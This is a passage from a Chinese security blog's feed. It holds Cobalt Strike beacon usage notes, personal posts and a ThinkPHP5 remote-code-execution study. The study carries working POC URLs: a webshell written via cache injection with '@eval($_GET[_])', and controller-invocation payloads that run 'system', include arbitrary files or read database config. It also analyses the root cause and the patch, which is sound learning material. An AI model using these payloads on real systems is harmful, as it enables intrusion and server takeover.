15ea3c7ed01439a7ef33ed08e33b192f82b5cf8ecf08590e5f09852654c379aa0842b2dca98bba923405e290a1cf04780cf60b73e14b93bb05c715b1e1227888b0868a9000ccb382a0916db6e84780d52232ae17c01b1a9c5847d21991e237bf4ba40a70108454218dbc0055af9519e53a4081c981caf2476d6aa27d66ab577d2c1fc263b73731400e54410a1685c525473aa0255141e33667b3d41828c81f3b6915bb06ed891eda5458ad0a1f629205edf47e27f6449866568069a54aa42bc66105ff76f918d10d75c6274ca375cec542bbade714c08c6331f69ced8a917da23241b4158012e55a250dd2c1bed5d162c63525f00698a181f0b88fdd9553ac05980a35b14b47aa2387ee65ea23319a76608c907cdc6ba0f327bf97a5984c20f3b4963691c7341e90f269491eb52dcc96f756677ef1d1bd5c9b59ec1d0d80304fd746973d5a1cc2c50d4250d47e061792aeedb814f5cc6fa3b7dd323e0a8285f9f5cee016d556e0c62555955661b07cc4c6feb566a7dadecbc2d93360b31c999fce0b1994f1e68f29a46e03862edc3d010813191abcb36ba1ae81f948e8a870be05c918cd0fcb537c82b709dabef826a039a69545f8debc8378617d61c4a4489c869c07510d16562f8a500b15007f090b0ed5f3b80acb04693bb5123b6161b7cead1d153293682240b42c66d62f2df3d89ff20836d58e174701c785142efa85186b8c1db634e02229050e7ed79dcb95ec135f2a6d8d7b83e35b02c2e4f2c1d5558e090ee37628c7394b9028c7ad94eb79d63b6e0620cb092ccf381f92a9472d505111dbe2fde75bd268afa76f7396a996b76e288973518bf543c0f5d083c3cbfec1ab6e8fa971983a4df191c253c5ebf69597ac0cf109b16752eeda8179a40f9b3a9862d1d3d1dd063b1ccc51bada60e1d33a3d152a4cc4c0402244c7fa88bc42fe4c12c08ecb96104c30233f37b17276d8dcc0329f581fae93320c3a2a557eef621fb58c3611ee44b4f431da29cd1529a8e9ec2825767124d409f0b5d613455092b715e05080f26385b56df2b4523ff114fa316bf0c0b99972b6f65c2f9d00f9b15cbea71f3973705f003046ea2c3fac872a3e1d9b6ae1f863cfb26b8525d1b7f86c548a96ef7bd0ba01a85f20f09539d2e12a37b5e3348a9240d46f5bab915a3bea59181922828ef2f3248fa62fd9c7651ce95bca890e1e7ac635fcaf6b9edbd0cc3a0b940b11c7687601d43d87198a84053c25e6db2f39ac0b65eb7d3aba55c8f95c3438997f44d2623ac78933f04a83103d3e0a63d53ec6d3b901ed3c817804f64926f443fa90aa0b2796499e2846d540c4d612ade7e7c56cca5c9d7671845136b174fae16e780742b9f99ff57a056a32839f112478a21bb990c288f10a400cc91ae16ffe1320bab00b06f906c238e9ce6288ce0cf60eaf09c236828227ce42278ba2db77f5a6a5680942c318aa8ded1fb83e0e0973e99969ac2a32f8a0eb1fc71e8c84669c64ef8d3dc19df3e28ba4d780c16f60f13f9184f1a8f65fe2acb3c27a5bb1f90b624c9453678752780da740bf33f6b7a2f498516a5b2d7f31bcfcbda026a2cfb714df136a3a31c50b4d0f36f7a405c914168cde9cd536a4ce8d46d64894cecec5dfcbfaf0d2926f2bfd67fd152f007afc4928f24c8eee7de855823a9d4cb293997400680b42424df54ab19d5156aa22aa40269fa707be4f9cc1841d8c9cfc6975fc753cd1d8890d936caf0533ebe0dad300a8233413e61ef4216ab89f8136096ed92dc0ad0353f8a286c3c25d824cc0752eab11c6503a2f0335612edd9df6355f26d2754266235e18ea799e27d1edd3c34b69e06241a3a19adf6eaec0f84485b9272d38a6e1be9c029cb15c0399dfdb23919491fe177a1f4cb6e27c85dd908bbd8706eda4e20b9e40d8c8be1c3b3a8d672bc7fe6a02fa4f210ee8104c26a3db4ba1b2242d736640921c80e592f6023b2b1ea976744a970025add3bfb085a9f2e084fdf185e7605abbcbce8d8d7dd6e9d726f70c6306215209c0d10b913ac2b8e1d2e0cdc3bad16f3c0d327498e99882ec29ba106086e4912e9175c70413c21a0bc7f368a49169b07b6015051334acf3e0952ac9b808b35fc44d8778da163eebbb200bad46ca71480681764bcca83a386a83fcf2283bd00d88477018d98b3209d8b0e955d0114547835f794b778ea015dd9d016d12083f6f9145790a20c8d857f097445f96b15b4c9d9afa0133476e92b7ed7da037eae818d6fe628e5e6dd557da4492f25d8dd7df418a76cd3b99cdc50b609b3caa25e2433d646b0884404a621d27446248c2923e07c08fb1ecea4cfcee06891e2b13e6f48e92a45a4ebf76440322221db9ca150a5f6ee4cd17672c4fe467b527d8d47f793012df005015d4c59a531813ea8321ebd2f7573c2562862510baa51337152b7704c5f042ebcc4cee28f337cbffa34a1e60c233223e06947a29b54c2c1534a010a71f8ac857f3ca547649ca38760b7c068ebf687922370bb38fe256b5d4db09f62349426f1196fbb09d8e29cb3b641f1da8c8897ed50e7e27cd043eb9a00cca6228f29a4718b0ce991121e6842dba32043a3659528a7e17bc063ecd15f62a1f79c978e182d41d1bba9468730953923daca96ace3748df93a88b4ecd8a04b9d969d6b1cb4120044251719dd922aa5686a0c987eaeb74985f24ef5c818aa892f334c47b7416f9ce9d348a93a1d49f55a8204cafc1c1ce6c23233d01a7354322b8cd8b7ba1c30ce4dc4cfcb152c71cd7a62705697057871f09f8690b2e447efc03cbd7159711636b3b79ffd8dd0c2baaffd10e2986d5dfe9aae7d7f94d30dc734593f80e957aa654f7ee5643b8e0b18f6b92c6af7bc72aafa7a9285e948f3b528facb60d07d67d676dde2d708a091294a9b093d0acca712c09cfd76ce5e8e3ccabc889f52681e2bfc69d74151cfbfa6f9d644ab7898536decf148836eba215d32930c5b7014ee673248389d934b413ac2edcb023c27461dd05c088c1eff12d5bf9fbdab462b3fe3524fe268ab5d0c4f9223f254535e801c87e7d634911655c5ec7d01345a14221ac0c7a61b5ba8a7aadeb3f1a57c27ab6af642d3c88785f95e3fee264169b2028550b4e4ad146fc302d8e54b3ad4ff9b2eada8c045fc738e00167b069cde44c177acfcb399d10f1e9d0a72c9112808247eaadcca7526fff6325a041054533c1413589459cd3601f652c8480ea19f54e17928a9f2ce15b8d5073570760766ab2d002f0161ef05230f2d6f83acb3bf39b37bfc5af253a66e396f0ac45a03247bdda44c07ddfcb5a2307750e7c47ba66f534f1a4cab79efdc87ce853d40f48ba3147d75b0699515a5e46cdd218a2c347cedd1d7c52e19932cc62d409fd4768580995a1fd0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike</title>
    <link href="https://hack-for.fun/558a.html"/>
    <id>https://hack-for.fun/558a.html</id>
    <published>2020-11-04T13:33:44.000Z</published>
    <updated>2020-11-04T15:33:14.631Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些关于cs的东西~</p><h1 id="CS-派生-MSF"><a href="#CS-派生-MSF" class="headerlink" title="CS 派生 MSF"></a>CS 派生 MSF</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104225034.png" alt="image-20201104213742247"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104233130.png" alt="image-20201104213816240"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213842.png" alt="image-20201104213839479"></p><h1 id="通过powershell来增强cs的实用性"><a href="#通过powershell来增强cs的实用性" class="headerlink" title="通过powershell来增强cs的实用性"></a>通过powershell来增强cs的实用性</h1><h2 id="在beacon-shell中导入外部ps脚本到远程机器上"><a href="#在beacon-shell中导入外部ps脚本到远程机器上" class="headerlink" title="在beacon shell中导入外部ps脚本到远程机器上"></a>在beacon shell中导入外部ps脚本到远程机器上</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;root&#x2F;test.ps1 &#x2F;&#x2F;导入各种powershell脚本，这里可以导入nishang模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell  posershell脚本名</span><br></pre></td></tr></table></figure><h2 id="在beacon-shell中直接执行powershell代码"><a href="#在beacon-shell中直接执行powershell代码" class="headerlink" title="在beacon shell中直接执行powershell代码"></a>在beacon shell中直接执行powershell代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-Host</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213434.png" alt="image-20201104213433262"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一些关于cs的东西~&lt;/p&gt;
&lt;h1 id=&quot;CS-派生-MSF&quot;&gt;&lt;a href=&quot;#CS-派生-MSF&quot; class=&quot;headerlink&quot; title=&quot;CS 派生 MSF&quot;&gt;&lt;/a&gt;CS 派生 MSF&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="渗透工具" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2020小组招新有感</title>
    <link href="https://hack-for.fun/abc8.html"/>
    <id>https://hack-for.fun/abc8.html</id>
    <published>2020-10-23T16:56:04.000Z</published>
    <updated>2020-11-07T15:13:03.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020年小组招新伴随着今天的宣讲会的结束，也算是告一段落了。当然后面还有二面、三面，等面试相关的工作。这些问题都不大了。</p></blockquote><p>在这里，我以道格19级成员的身份，写一篇感受吧。</p><p>感受最深的，其实就是一个团体、一个组织，一定要有团结力、凝聚力。大家都一心往小组的未来发展考虑，有什么事大家一起分工协作，有难题大家一起想办法解决。</p><p>当然，这个过程中也有不好的体验。一个团体，不免会有出现划水的情况，部分师傅不够积极也是能够直接感受到的，但是不能说不好，毕竟这个感受是通过和其他团体成员比较得出的感受，不针对个人。</p><p>从谋划招新计划、到招新摆摊、申请宣讲会教室。两个管理小姐姐、<a href="http://xun9er.com/">Xun9er</a> 、和小帅锅，和学校层面、学校社团方面，还是有过不少的对线，也很辛苦。</p><p>招新摆摊那两天、老是下着小雨、第一天人还可算多、第二天人就慢慢少起来了。不过是新生少了，我们的人也少了。确实， 我们每天的事也挺多了，也不能把所有精力投入到招新工作中。蚊子多、湿冷。最后一晚上、搬离设施的时候、就来了4-5个小伙伴。</p><p>好在拉了个小群，也就10 个人在里面，活跃的也不过就3-4个人。里面还是有2-3个学弟我认为还比较可以，希望他们能够努力学习、通过考核。</p><p>宣讲会上，第一次感觉一个小组在一起办事、真的会方便很多。也拍了拍合照，也算是第一次拍正式合照了。</p><p>宣讲会，问了下学弟的评价，还算可以。会上，我也听到大家都笑了，这就对了。</p><p>最后，继续野蛮生长吧。我们还有很长的路要走，未来的发展，离不开每一个成员的努力，CTF排名、SRC挖洞、CVE、CNVD、大厂offer，是我们每个人奋斗的目标。</p><p>对了，我们不光只会搞技术， 我们也是很活泼开朗可爱的一群人呀！</p><p>照片就不放了，哈哈。想看加我微信或者QQ吧。</p><ul><li>博文删除密码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020年11月 7日 星期六 23时12分37秒 CST</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2020年小组招新伴随着今天的宣讲会的结束，也算是告一段落了。当然后面还有二面、三面，等面试相关的工作。这些问题都不大了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在这里，我以道格19级成员的身份，写一篇感受吧。&lt;/p&gt;
&lt;p&gt;感受最深的，其实就</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 如何修改账户名</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>然后之前一直想修改，但是哪里是灰色的，无法修改。</p><p>修改后：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>修改方法：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>点击锁，输入密码之后就可以进行操作了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>然后点击 + 号，新建一个管理员用户。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>退出当前登录的用户（也是因为当前这个用户是处于登录状态，所以无法直接修改account name。</li><li>登录创建的test 管理员账号，直接跳过Apple ID 之类的设置，然后去修改account name。</li><li>切换回来就OK了。</li><li>删除创建的test 管理员用户。</li></ul><p>原来这样简单。</p><blockquote><p>其实很多事情，或许都简单，只是在于自己愿不愿意去做。</p></blockquote><p>最近也是心神不定的，好好学习嘛！Docker 逃逸好几种方法都没复现成功，淦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2020-09-27T13:39:21.764Z</updated>
    
    <content type="html"><![CDATA[<p>主要参考资料：</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-利用缓存文件GetShell从而RCE"><a href="#RCE1-利用缓存文件GetShell从而RCE" class="headerlink" title="RCE1(利用缓存文件GetShell从而RCE)"></a>RCE1(利用缓存文件GetShell从而RCE)</h1><p>相关参考资料：<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 的缓存类中。该类会将缓存数据通过序列化的方式，直接存储在 <code>.php</code> 文件中，攻击者通过精心构造的 <strong>payload</strong> ，即可将 <strong>webshell</strong> 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 <strong>远程代码执行漏洞</strong> 。</p></blockquote><p>漏洞利用前提：</p><ul><li><p>站点能够将缓存文件列出，并且用户可以得到路径</p></li><li><p>1、缓存使用文件方式并且缓存目录暴露在web目录下面<br>2、攻击者要能猜到开发者使用的缓存key</p></li><li><p>知道缓存类所设置的键名，这样才能找到 <strong>webshell</strong> 路径；其次如果按照官方说明开发程序， <strong>webshell</strong> 最终会被写到 <strong>runtime</strong> 目录下，而官方推荐 <strong>public</strong> 作为 <strong>web</strong> 根目录，所以即便我们写入了 <strong>shell</strong> ，也无法直接访问到；最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></li><li><blockquote><p>5.0的部署建议是public目录作为web目录访问内容，其它都是web目录之外，当然，你必须要修改public/index.php中的相关路径</p></blockquote></li></ul><p>比如这里修改的index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ThinkPHP 的5.0.11 release 信息中：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>更新了完善缓存驱动(安全更新)。再去查看commit记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>修复方式为将缓存文件的内容拼接到<code>&lt;?php ?&gt;</code> 标签之外，并且使用了<code>exit()</code>函数来退出当前脚本。</p><p>可下断点进行单步调试，观察整个参数在Cache类以及Request类下进过相关方法的过滤，转换，并最终写入了缓存文件的过程。</p><p>首先是<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> 未实例化，所以为调用<code>autoload</code>方法，自动加载机制来进行一系列实例化操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>然后到helper.php 中的 <code>input</code>方法，判断请求的方法和请求的参数，此处为<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>然后返回过滤后的值，继续调用<code>Request</code> 类的 <code>get</code> 方法和 <code>Input</code> 方法（在TP5)中参数的处理都是这样的了，</p><p>经过<code>filterVaule</code>和<code>filterExp</code>函数进行特殊字符过滤和相关判段后返回给<code>$data</code></p><hr><p>然后来到Cache 类的<code>set</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>调用了Cache 类的init 方法，该方法继续调用了 Config里的get方法，这些操作是在为缓存内容做一些初始化操作。然后再到Cache 类的 connect 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>为缓存文件的文件名进行md5返回。这里的<code>self::handler</code>为<code>think\cache\driver\File</code>类。所以会调用<code>File</code>类的<code>set</code>方法。该方法调用了<code>getCacheKey</code>方法来获取缓存文件的文件名。文件名的机制如下图，先是对<code>$name</code> md5，然后截取前两位作为目录名，后面部分作为文件名然后和<code>.php</code>后缀进行拼接。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>看看set方法的处理流程：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>最后通过<code>file_put_contents</code>函数，将<code>$data</code>（参数内容可控，并且没有对data参数进行任何过滤等操作，只是序列化后拼接存储在文件中，这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。虽然在序列化数据前面拼接了单行注释符 <strong>//</strong> ，但是我们可以通过注入换行符绕过该限制。） 写入<code>$filename</code>从而GetShell。</p><blockquote><p>最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话(也就是上上图中的设置文件名前缀的代码)，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></blockquote><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1，thinkphp3.2的版本请选择开启：DATA_CACHE_KEY 这样就算你使用的cms是开源的人家发现了这个也无法使用。<br>2，tp3.2-tp5  做好目录权限，除公共目录绝对不要让外部可访问</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-利用任意控制器调用RCE"><a href="#RCE2-利用任意控制器调用RCE" class="headerlink" title="RCE2(利用任意控制器调用RCE)"></a>RCE2(利用任意控制器调用RCE)</h1><blockquote><p>控制器过滤不严，结合直接返回类名的代码操作，导致可以用命名空间的方式来调用任意类的任意方法</p></blockquote><p>获取复现代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json 的  require 字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>相关参考资料：</p><p><strong>感觉自己分析的不好，要学习还是去看参考资料吧。</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>这里以以这个POC进行分析，ThinkPHP 版本为<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p></blockquote><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>不同版本的Payload，需要做相关的调整。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在5.1.31的更新中，查看相关更新的信息，其中关于<code>修正控制器名获取</code> 的commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>另外，官方对于此处更新，专门发了一次微信公告。<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>内容如下：</p><blockquote><p>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的<code>getshell</code>漏洞，受影响的版本包括<code>5.0</code>和<code>5.1</code>版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>默认情况下，ThinkPHP 不开启强制路由，并且开启了路由器兼容模式，<code>s</code>。</p><p>5.1.31 修复地址：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>两个关键点：</p><ul><li>控制器名</li><li>强制路由</li></ul><p>by 七月火师傅：</p><blockquote><p>在没有开启强制路由，说明我们可以使用路由兼容模式 <strong>s</strong> 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器，那么我们可以试着利用 <code>http://site/?s=模块/控制器/方法</code> 来测试一下。在先前的 <strong>ThinkPHP SQL注入</strong> 分析文章中，我们都有提到所有用户参数都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法处理，该方法会调用 <strong>filterValue</strong> 方法，而 <strong>filterValue</strong> 方法中使用了 <strong>call_user_func</strong> ，那么我们就来尝试利用这个方法。</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" 